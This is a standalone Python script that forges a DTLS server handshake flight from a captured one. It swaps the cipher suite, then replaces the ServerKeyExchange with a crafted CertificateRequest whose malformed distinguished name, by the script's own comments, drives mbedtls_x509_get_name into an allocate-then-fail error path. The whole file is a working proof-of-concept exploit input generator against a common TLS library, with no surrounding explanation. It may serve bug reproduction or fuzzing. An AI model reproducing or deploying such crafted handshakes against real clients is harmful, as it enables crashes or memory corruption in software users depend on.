import sys
d=open(sys.argv[1],'rb').read();o=0;recs=[]
while o+13<=len(d):
    ln=int.from_bytes(d[o+11:o+13],'big');recs.append(bytearray(d[o:o+13+ln]));o+=13+ln
hvr,sh,crt,ske,shd=recs[:5]
# ServerHello: switch suite to TLS_RSA_WITH_AES_128_GCM_SHA256 (plain RSA kx => no ServerKeyExchange)
b=13+12; sidlen=sh[b+34]; so=b+35+sidlen
sh[so:so+2]=bytes.fromhex(sys.argv[3])
# CertificateRequest with one DN whose DER makes mbedtls_x509_get_name allocate a node then fail:
# 30 0f { 31 0b { 30 09 { 06 03 55 04 06, 13 02 'NL' } }, 00 00 <- not a SET }
dn=bytes.fromhex('300f310b3009060355040613024e4c0000')
dns=len(dn).to_bytes(2,'big')+dn
body=bytes([1,1])+bytes.fromhex('00020401')+len(dns).to_bytes(2,'big')+dns
hs=bytes([13])+len(body).to_bytes(3,'big')+(3).to_bytes(2,'big')+b'\0\0\0'+len(body).to_bytes(3,'big')+body
cr=bytearray(ske[:11])+len(hs).to_bytes(2,'big')+hs   # reuse SKE's record header/seq (3)
shd[13+4:13+6]=(4).to_bytes(2,'big')                  # ServerHelloDone keeps record seq 4, hs seq 4
out=bytes(hvr+sh+crt+cr+shd)
open(sys.argv[2],'wb').write(out); print('wrote',len(out))
